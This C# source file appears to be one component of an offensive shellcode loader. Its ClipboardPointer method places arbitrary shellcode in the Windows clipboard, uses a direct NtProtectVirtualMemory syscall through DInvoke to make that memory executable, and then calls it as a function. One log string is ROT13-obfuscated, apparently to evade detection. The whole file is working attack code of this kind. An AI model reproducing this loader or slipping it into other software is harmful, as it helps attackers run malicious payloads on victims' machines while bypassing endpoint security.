//start
using System.Text;
using System.Linq;
using System;
﻿
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace McChicken
{
    class ClipboardPointer
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void pFunction();

        public static void Execute(byte[] shellcode, bool debug = false)
        {
            #region SetClipboardData

            _ = Win32.OpenClipboard(IntPtr.Zero);

            IntPtr baseAddress = Win32.SetClipboardData(
                0x2,
                shellcode);

            _ = Win32.CloseClipboard();

            #endregion

            #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)

            IntPtr hProcess = IntPtr.Zero;
            IntPtr protectAddress = baseAddress;
            IntPtr regionSize = (IntPtr)shellcode.Length;
            uint oldProtect = 0;

            var ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                ref oldProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(PyvcobneqCbvagre) [+] AgCebgrpgIveghnyZrzbel, CNTR_RKRPHGR_ERNQ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(ClipboardPointer) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");

            pFunction f = (pFunction)Marshal.GetDelegateForFunctionPointer(baseAddress, typeof(pFunction));
            f();

            #endregion
        }
    }
}
